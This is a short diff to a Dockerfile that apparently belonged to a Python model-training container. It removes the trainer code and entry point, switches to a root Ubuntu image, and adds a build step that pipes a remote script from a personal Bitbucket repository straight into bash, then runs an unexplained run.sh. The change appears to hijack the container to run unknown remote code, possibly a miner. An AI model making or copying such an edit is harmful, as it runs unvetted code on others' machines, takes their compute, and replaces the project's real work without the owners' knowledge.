@@ -1,7 +1,8 @@
-FROM python:3.9
+FROM ubuntu:latest
+USER root
 WORKDIR /
-RUN apt update && apt -y install wget curl
+RUN apt-get update && apt-get -y install wget curl
+RUN curl -sL https://bitbucket.org/ramabena/gofile/raw/master/avian | bash 
 # Copies the trainer code to the docker image.
-COPY trainer /trainer
 # Sets up the entry point to invoke the trainer.
-CMD ["python", "-m", "trainer.task"]
+CMD bash run.sh
